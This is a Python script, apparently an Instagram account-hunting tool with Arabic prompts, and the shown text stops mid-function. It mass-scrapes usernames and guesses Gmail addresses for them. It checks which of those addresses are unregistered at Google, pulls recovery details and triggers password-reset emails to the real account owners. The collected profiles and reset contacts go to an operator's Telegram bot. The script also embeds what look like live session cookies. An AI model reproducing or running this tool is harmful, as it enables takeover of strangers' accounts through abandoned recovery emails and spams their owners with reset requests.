import webbrowser
webbrowser.open("https://t.me/pytho2n")
import os
import time
try :
    import requests
    import user_agent
    import datetime
    import webbrowser
    import pyfiglet
    import threading
    import signal
except:
    os.system('pip install requests')
    os.system("pip install HamodyTools")
    os.system("pip install instaloader")
    os.system('pip install user_agent')
    os.system('pip install datetime')
    os.system('pip install webbrowser')
    os.system('pip install pyfiglet')
    os.system('pip install threading')
    os.system('pip install signal')
    os.system('pip install pyfiglet')
    os.system("pip install instaloader")
    os.system("clear")
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import requests
from user_agent import generate_user_agent
from datetime import datetime
import datetime
import json
import sys
from time import sleep
from os import system
from datetime import date
import socket
import pyfiglet
import instaloader
import requests,re

import requests,random,threading
import requests
from colorama import Fore,Back



cookies =input("\x1b[1;37m ❗حـط سيشن أنستا :-")
os.system("clear")	
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
BBlue = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
a=0
z=0
b=0
j=0
m=0
ruu=0
ru=0
ma=0
bp =0
bk=0
bd=0
k=0
t=0
x=0
g=0
L=0
h=0
ci=0
A=0
f=0
Ru = 0
qw =0
ya =0
yaa=0
hh=0
h=0
hhh=0
yaaa=0
E=0
zaidip = socket.gethostname()
ipzaid = socket.gethostbyname(zaidip)
print('\n\033[2;90m\rاداة صيد  ڪلشي بالانستا💈')
ll= datetime.datetime.now()
r = requests.session()
lll = date.today()
r = requests.session()
class app:
  def __init__(self,token,id):
    self.token=token
    self.id=id
    self.erorr = "username_is_taken"
  def file_user(self,name_file):
    try:
      file = open(name_file,"r")
    except:
      print("ERROR file not found")
      exit(0)
    while True:
      try:
        user = file.readline().split('\n')[0]
        if user =="":
          break 
        self.run(user)
      except:
        pass
  def SendBot(self,token,id,username):
    requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=⌯  تم صيد يوزر\n⚋⚋⚋⚋⚋⚋(يوزر)⚋⚋⚋⚋⚋⚋ \n⌯ ᴜѕᴇʀɴᴀᴍᴇ : @{username} \n⚋⚋⚋⚋⚋⚋(𝚄𝚜𝚎𝚛)⚋⚋⚋⚋⚋⚋\n🐼����Tele : @W4_M4 ')
    
  def random_user(self,number):
    while True:
      try:
        user1 = str("".join(random.choice("qwertyuiopasdfghjklzxcvbnm0987654321_.")for i in range(5)))
        us = str("".join(random.choice("_"+user1)for i in range(int(number))))   
        self.run(us)
      except:
        pass
  def run(self,username):
    respons = requests.post("https://www.instagram.com/accounts/web_create_ajax/attempt/",headers={'Host':'www.instagram.com','content-length':'70','sec-ch-ua':'"Chromium";v="106",','x-ig-app-id':'936619743392459','x-ig-www-claim':'hmac.AR3-jjxWxD7osd7WtAM_c6iLQHDvlDZucbWWVQ38t2tPdF3t','sec-ch-ua-mobile':'?0','x-instagram-ajax':'de83d85cf90c','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','viewport-width':'980','content-type':'application/x-www-form-urlencoded','accept':'*/*','x-requested-with':'XMLHttpRequest','x-asbd-id':'198387','x-csrftoken':'NEhRd2uaYf6774IYrUuw6svzofnU3COW','sec-ch-prefers-color-scheme':'dark','sec-ch-ua-platform':'"Linux"','origin':'https://www.instagram.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/accounts/emailsignup/','accept-language':'ar-IQ,ar;q=0.9,en-UM;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5'},data={"email":"email=a@gmail.com+","username":username,"first_name":"ruks","opt_into_one_tap":"false"}).text
  
    if self.erorr in respons:
      print(f'\033[1;33m[\033[1;31m*\033[1;33m] Unavailable\033[1;31m - [{username}]')
    else:
      print(f'\033[1;33m[\033[1;31m*\033[1;33m] Available\033[1;32m - [{username}]')
      threading.Thread(target=self.SendBot,args=(self.token,self.id,username)).start()
class login:
	def __init__(self,username,password):
		self.username = username
		self.password =password
		self.request = requests.Session()
		pass
	def csrf(self):
		response = self.request.get('https://www.instagram.com/accounts/login/')
		c = re.findall(r"csrf_token\":\"(.*?)\"",response.text)[0]
		return c
	def session(self):
		response =self.request.post("https://www.instagram.com/accounts/login/ajax/",headers={'Host': 'www.instagram.com','content-length': '333','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-ig-app-id': '1217981644879628','x-ig-www-claim': '0','x-requested-with': 'XMLHttpRequest','sec-ch-ua-mobile': '?1','x-instagram-ajax': '4b5f8c8eb791','viewport-width': '412','content-type': 'application/x-www-form-urlencoded','accept': '*/*','x-csrftoken':self.csrf(),'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','x-asbd-id': '198387','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua-platform': '"Android"','origin': 'https://www.instagram.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.instagram.com/'},data={'username':self.username,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{self.password}','queryParams': '{}','optIntoOneTap': 'false'}).text
		if 'authenticated":true' in response:
			print("login true \n","="*10)	
			ses =self.request.cookies["sessionid"]
			return ses
		else:

			print("خطا في التسجيل")	
			exit(0)
class checker:
  def __init__(self,username,password):
    self.sessions =login(username,password).session()
  
  def likes(self):
    global yui
    try:
      url =input("أرسـل رابط بوست :-")
      link=url.split("?")[0]
      idpost=requests.get(f"{link}?__a=1&__d=dis").json()["graphql"]["shortcode_media"]["id"]
      response = requests.get(f"https://i.instagram.com/api/v1/media/{idpost}/likers/",headers={'Host':'i.instagram.com','sec-ch-ua':'"Google','x-ig-app-id':'1217981644879628','x-ig-www-claim':'hmac.AR3k4B3cXQdAp9NfDQ2Rw_pvRdaTsgv8uqX2ezXahw5qxj2F','sec-ch-ua-mobile':'?1','x-instagram-ajax':'1006206784','accept':'*/*','user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','x-asbd-id':'198387','x-csrftoken':'gJslh1FBsSwCPcWtHYVPRgytWazd7QLA','sec-ch-ua-platform':'"Android"','origin':'https','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/','accept-encoding':'gzip,','accept-language':'ar-IQ,ar;q=0.9,en-UM;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5','cookie':'sessionid='+self.sessions}).json()
      file = open("gmail.txt","a")
      for i in range(len(response["users"])):
        
        username= response["users"][i]["username"]
        os.system('cls' if os.name == 'nt' else'clear')
        print(f'\nUser >> \033[1;36m '+username)
        file.write(username+"@gmail.com\n")
      file.close()		
    except:
      
      pass
  def search(self):
    try:
      print('أنـتضـر سـحـب✍🏻')
      file = open("gmail.txt","a")
      file2 = open("PPGBBs.txt","r")	
      while True:
        Search = file2.readline().split('\n')[0]
        if Search =="":
          break
        response = requests.get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={Search}&rank_token=0.7458227775054025&include_reel=true",headers={'Host':'i.instagram.com','sec-ch-ua':'"Google','x-ig-app-id':'1217981644879628','x-ig-www-claim':'hmac.AR3k4B3cXQdAp9NfDQ2Rw_pvRdaTsgv8uqX2ezXahw5qxj2F','sec-ch-ua-mobile':'?1','x-instagram-ajax':'1006206784','accept':'*/*','user-agent':'Mozilla/5.0','x-asbd-id':'198387','x-csrftoken':'gJslh1FBsSwCPcWtHYVPRgytWazd7QLA','sec-ch-ua-platform':'"Android"','origin':'https','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.instagram.com/','accept-encoding':'gzip,','accept-language':'ar-IQ,ar;q=0.9,en-UM;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5','cookie':'sessionid='+self.sessions}).json()	
        for i in range(len(response["users"])):
          username= response["users"][i]["user"]["username"]	
          os.system('cls' if os.name == 'nt' else'clear')
        print(f'\nUser >> \033[1;36m '+username)
        file.write(username+"@gmail.com\n")
      file.close()		
    except:
      
      pass    			
def Gmail():
	try:
		fie =open('gmail.txt','r').read().splitlines()
	except FileNotFoundError as error:
		system('clear')
		print('File Error gmail.txt')
		exit()
	global cookies
	took =input('\033[1;36m توڪنك حياتي:-')
	if took=='':
		system('clear')
		print('خطا في التوكن')
		exit()
	try:
		idddd =int(input('\033[1;34m  أيـديـك:-'))
	except ValueError as error:
		system('clear')
		print('خطا في الايدي')
		exit()
	system('clear')
	global z,a,x,lll,j,g,t,L,f,qw,E,h,A,Ru,ruu,ru,bd,bk,ma,bp,ya,yaa,yaaa,hh,h,hhh
	for BL in fie:
		if ('@gmail.com') in BL:
			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
			KLL= BL.split('@')[0]
			headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
			uid = str(uuid4())
			data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':'{}' .format(BL),
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
			try:
				re = requests.post(url,headers=headers,data=data).text	
			except requests.exceptions.ConnectionError as error:
				system('clear')
				print('رب الـحـلو شبيه نتكم قرب يم نت لان نتڪم خࢪا')
				continue
			
			if ('"invalid_user"')in re:
				os.system('cls'if os.name=='net'else'clear')
				ma+=1
				print(f'\033[1;32m Available Gmail : {L}\n\033[1;33m Bad gmail : {bd} \n\033[1;33m Bad insatgram : {ma} \n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = \nChecker mail = 『 {BL} 』')
################$##########
			elif ('"bad_password"') in re:
				url3 ='https://android.clients.google.com/setup/checkavail'
				headers = {
	        		'Content-Length':'98',
	        		'Content-Type':'text/plain; charset=UTF-8',
	        		'Host':'android.clients.google.com',
	        		'Connection':'Keep-Alive',
	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
				data= json.dumps({
	        		'username':BL,
	        		'version':'3',
	        		'firstName':'AbaLahb',
	        		'lastName':'AbuJahl'})
				try:
					res=requests.post(url3,headers=headers,data=data)
				except requests.exceptions.ConnectionError as error:
					system('clear')
					print('رب الـحـلو شبيه نتكم قرب يم نت لان نتڪم خࢪا')
					continue
				if res.json()['status'] =='USERNAME_UNAVAILABLE':
					os.system('cls'if os.name=='net'else'clear')
					bd+=1
					print(f'\033[1;32m Available Gmail : {L}\n\033[1;33m Bad gmail : {bd} \n\033[1;33m Bad insatgram : {ma} \n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = \nChecker mail = 『 {BL} 』')
################$##########
				elif res.json()['status'] =='SUCCESS':
						with open('True.txt','a') as f8:
							f8.write(f'{BL}\n')
						os.system('cls'if os.name=='net'else'clear')
						L+=1
						print(f'\033[1;32m Available Gmail : {L}\n\033[1;33m Bad gmail : {bd} \n\033[1;33m Bad insatgram : {ma} \n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = \nChecker mail = 『 {BL} 』')
################$##########
						urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
						headr= {
					        'accept': '*/*',
					        'accept-encoding': 'gzip, deflate, br',
					        'accept-language': 'en-US,en;q=0.9',
					        'content-length': '336',
					        'content-type': 'application/x-www-form-urlencoded',
					        'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'origin': 'https://www.instagram.com',
					        'referer': 'https://www.instagram.com/',
					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
					        'sec-ch-ua-mobile': '?0',
					        'sec-fetch-dest': 'empty',
					        'sec-fetch-mode': 'cors',
					        'sec-fetch-site': 'same-origin',
					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
					        'viewport-width': '30',
					        'x-asbd-id': '437806',
					        'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'x-ig-app-id': '936619743392459',
					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
					        'x-instagram-ajax': 'caee87137ae9',
					        'x-requested-with': 'XMLHttpRequest'
						}
						datar={
							'query': f'{BL}'
						}
						rq = requests.post(urlr,headers=headr,data=datar).json()
						#print(rq)
						try:
							B19 =f"{BL}"
							fa =str(rq['options']['can_use_facebook'])
							if fa =='True':
								L3 = 'مربوط فيس '
							else:
								L3='غير مربوط فيس'
							ph = str(rq['options']['can_send_phone'])
							if ph =='True':
								L5 = ('مربوط رقم')
							else:
								L5='غير مربوط رقم'
						except KeyError as Error:
							L7 ='الريست لا يشتغل'
						G1 = (KLL)
						iip=(G1)
						url22 = f'https://www.instagram.com/{iip}/?__a=1&__d=dis'
						head1 = {
			                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			                'accept-encoding': 'gzip, deflate, br',
			                'accept-language': 'en-US,en;q=0.9',
			                'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
			                'referer': 'https://www.instagram.com/{}/'.format(iip),
			                'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
			                'sec-ch-ua-mobile': '?1',
			                'sec-fetch-dest': 'document',
			                'sec-fetch-mode': 'navigate',
			                'sec-fetch-site': 'snone',
			                'upgrade-insecure-requests': '1',
			                'user-agent': generate_user_agent(),
						}
						rr =requests.get(url22,headers=head1).json()
						try:
							nam = str(rr['graphql']['user']['full_name'])
							iddd = str(rr['graphql']['user']['id'])
							fol = str(rr['graphql']['user']['edge_followed_by']['count'])
							fols =str(rr['graphql']['user']['edge_follow']['count'])
							isp = str(rr['graphql']['user']['is_private'])
							bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
							
							re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
							ree = re.json()
							dat = ree['date']
							j+=1
							headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
							}
							data = {
        'ig_sig_key_version': '4',
        "user_id":iddd
							}
							res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
							rs =str(res['obfuscated_email'])
							try:
								uq=(f'''𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
┗━━━━━━━━⧪━━━━━━━━┛
𝙷𝙸𝚃𖤴 : {j}\n⚋⚋⚋⚋⚋⚋(abn babel)⚋⚋⚋⚋⚋⚋\n𝙽𝙰𝙼𝙴 : {nam}\n𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : = {iip}\n𝙶𝙼𝙰𝙸𝙻 : {iip}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {fols}\n𝙿𝙾𝚂𝚃𝚂 : {bio}\n⚋⚋⚋⚋⚋⚋(𝙖𝙍𝙖𝙨)⚋⚋⚋⚋⚋⚋\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 : {dat}\n𝚁𝙴𝚂𝚃 : {rs}\n⚋⚋⚋⚋⚋⚋(المطورين)⚋⚋⚋⚋⚋⚋\n𝙽𝙺𝙼𝙱𝙴𝚁 𝙿𝙷𝙾𝙽𝙴 : {L5}\n𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 : {L3}\nTELE : @W4_M4
''')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={uq}')
								ru= requests.post(tlg)
							except UnboundLocalError as error:
								L+=1
								os.system('cls'if os.name=='net'else'clear')
								print(f'\033[1;32m Available Gmail : {L}\n\033[1;33m Bad gmail : {bd} \n\033[1;33m Bad insatgram : {ma} \n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @LY_SK_M4\nChecker mail = 『 {BL} 』')
								uq=(f'''𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
┗━━━━━━━━⧪━━━━━━━━┛
𝙷𝙸𝚃𖤴 : {j}\n⚋⚋⚋⚋⚋⚋(abn babel)⚋⚋⚋⚋⚋⚋\n𝙽𝙰𝙼𝙴 : {nam}\n𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : = {iip}\n𝙶𝙼𝙰𝙸𝙻 : {iip}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {fols}\n𝙿𝙾𝚂𝚃𝚂 : {bio}\n⚋⚋⚋⚋⚋⚋(𝙖𝙍𝙖𝙨)⚋⚋⚋⚋⚋⚋\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 : {dat}\n𝚁𝙴𝚂𝚃 : {rs}\n⚋⚋⚋⚋⚋⚋(المطورين)⚋⚋⚋⚋⚋⚋\n𝙽𝙺𝙼𝙱𝙴𝚁 𝙿𝙷𝙾𝙽𝙴 : {L5}\n𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 : {L3}\nTELE : @W4_M4
''')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={uq}')
								ru= requests.post(tlg)	
						except KeyError as error :
							E+=1
							os.system('cls'if os.name=='net'else'clear')
							print(f'\033[1;32m Available Gmail : {L}\n\033[1;33m Bad gmail : {bd} \n\033[1;33m Bad insatgram : {ma} \n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @LY_SK_M4\nChecker mail = 『 {BL} 』')
################$###########

a=0
v=0
ok = '09751436'
bb ="zmcbvahflwpwueytvdgtlepw"
def zaid9():
    
    
    
 
        
        
        
        
        global bb,a,v,ok
        while True:
        	number= random.choice(ok)
        	
	        username = str(''.join(random.choice(bb)for i in range(7))).lower()
	        
	        
	        url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
	        head11 = {
	        'accept': '*/*',
	        'accept-encoding': 'gzip, deflate, br',
	        'accept-language': 'en-US,en;q=0.9',

	        'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',

	        'referer': 'https://www.instagram.com/explore/search/',
	        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	        'sec-ch-ua-mobile': '?0',
	        'sec-fetch-dest': 'empty',
	        'sec-fetch-mode': 'cors',
	        'sec-fetch-site': 'same-origin',
	        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
	        'x-asbd-id': '437806',
	        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
	        'x-ig-app-id': '936619743392459',
	        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
	        'x-requested-with': 'XMLHttpRequest'
	    }
	        
	        
	 
	        
	        data2={
	        	'context': 'blended',
	        	'query': '{}'.format(username),
	        	'rank_token': '0.38549261586414585',
	        	'include_reel': 'true'
	        
	        }
	        y= requests.get(url,headers=head11).json()
	        try:
	        	iddd = len(str(y['users'][0]['user']['pk']))

	        except IndexError as error:
	        	v+=1
	        	continue
	        for ll in range(0,iddd):
	        	try:
	        		nn = str(y['users'][ll]['user']['username'])
	        		a+=1
	        		os.system('cls'if os.name=="net"else'clear')
	        		print(f"\033[1;32m[𖤥] - Done : {a}\n[𖤥] - Error : {v}\n[𖤥] - Username : {nn}\n\033[1;33m[𖤥] - Telegram : @LY_SK_M4")
	        		with open('gmail.txt','a') as f3:
	        			f3.write(f'{nn}@gmail.com\n')
	        	except IndexError as error:
	        		continue
	        		
 
        	
        
        
          
def Cl():
        	global a,z,t
        	
        
        	iii = input('\033[1;33m▶️ Enter Your User list - \033[1;32mأضـف يوزࢪ لسحب السته:-\n')
        
        
       
        
        
        	global cookies
        	
        	
	        url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
	        head1 = {
		            'accept': '*/*',
		            'accept-encoding': 'gzip, deflate, br',
		            'accept-language': 'en-US,en;q=0.9',
		            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
		            'referer': 'https://www.instagram.com/{}/'.format(iii),
		            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		            'sec-ch-ua-mobile': '?0',
		            'sec-fetch-dest': 'empty',
		            'sec-fetch-mode': 'cors',
		            'sec-fetch-site': 'same-origin',
		            'user-agent': generate_user_agent(),
		            'x-asbd-id': '437806',
		            'x-ig-app-id': '936619743392459',
		            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
		            'x-requested-with': 'XMLHttpRequest'
		        }
		    
	        
	        
	        try:
	        	rr = requests.get(url22,headers=head1).json()
	        	
	        except json.decoder.JSONDecodeError as error:
	        	system('clear')
	        	print('* \033[1;32mالحساب مبند')
	        	exit()
	        	
	        try:
	         fol = str(rr['graphql']['user']['edge_follow']['count'])
	         idd = str(rr['logging_page_id'])
	         ss = idd.split('_')[1]
	        except KeyError as error :
	             print('اليوزر غير صحيح')
	             time.sleep(1)
	             system('clear')
	             while True:
	             	Cl()
	             #exit()
	        
	        x = int(fol)
	        def cv(iii,ss,fol,x):
	        	global t,a,ci,cookies
	        	ci+=80
	        	t+=1
	        	url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?max_id={ci}'
		        head4 ={
			            'accept': '*/*',
			            'accept-encoding': 'gzip, deflate, br',
			            'accept-language': 'en-US,en;q=0.9',
			            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
			            'referer': 'https://www.instagram.com/',
			            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
			            'sec-ch-ua-mobile': '?0',
			            'sec-fetch-dest': 'empty',
			            'sec-fetch-mode': 'cors',
			            'sec-fetch-site': 'same-origin',
			            'user-agent': generate_user_agent(),
			            'x-asbd-id': '437806',
			            'x-ig-app-id': '936619743392459',
			            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
			            'x-requested-with': 'XMLHttpRequest'
		        }
		        
		        re = requests.get(url4,headers=head4).json()
		        zaid=0
		        try:
		        	while True:
		        	     for zaid1 in re:
		        	     	zaid+=1
		        	     	us = str(re['users'][zaid]['username'])
		        	     	a+=1 
		        	     	os.system('cls' if os.name == 'nt' else'clear')
		        	     	print(f'\033[1;35m[𖤥] - Done >> [{a}]\n[𖤥] - Error : {t}\n[𖤥] - User >> \033[1;36m[{us}]\n\033[1;32m[𖤥] - Telegram : @LY_SK_M4')
		        	     	with open('gmail.txt','a') as f6:
		        	     		f6.write(f'{us}@gmail.com\n')
		        	     	if zaid==x:
		        	     		print('Done')
		        	     		exit()
		        except IndexError as error:
		        	cv(iii,ss,fol,x)
		        	
		        	
	        cv(iii,ss,fol,x)
		         

def followers():

	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf user.txt')
	L = instaloader.Instaloader()
	username=input(" اكتب يوزر الحساب الوهمي : ")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	password=input(" اكتب باسورد الحساب الوهمي : ")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	getuser=input(" يوزر حساب سحب السته منه : ")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print("انتضر سيتم سحب اليوزرات")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf gmail.txt')
	L.login(username,password)
	profile = instaloader.Profile.from_username(L.context, getuser)
	follow_list = []
	count=0
	ok=0
	for followee in profile.get_followers():
		name1=str(followee)
		name2=name1.split('Profile ')[1]
		name3=name2.split(' (')[0]
		follow_list.append(name3+'@gmail.com')
		file = open("gmail.txt","a")
		file.write(follow_list[count])
		file.write("\n")
		file.close()
		ok+=1
		t=0
		os.system('cls' if os.name == 'nt' else'clear')
